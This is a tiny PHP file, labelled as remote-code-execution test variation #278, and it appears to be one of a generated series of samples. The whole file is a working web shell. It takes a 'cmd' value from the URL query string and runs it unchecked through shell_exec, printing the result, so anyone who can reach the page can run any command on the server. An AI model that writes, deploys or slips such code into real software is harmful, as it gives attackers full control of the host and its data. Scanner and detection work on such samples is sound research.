<?php
// RCE test variation #278
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>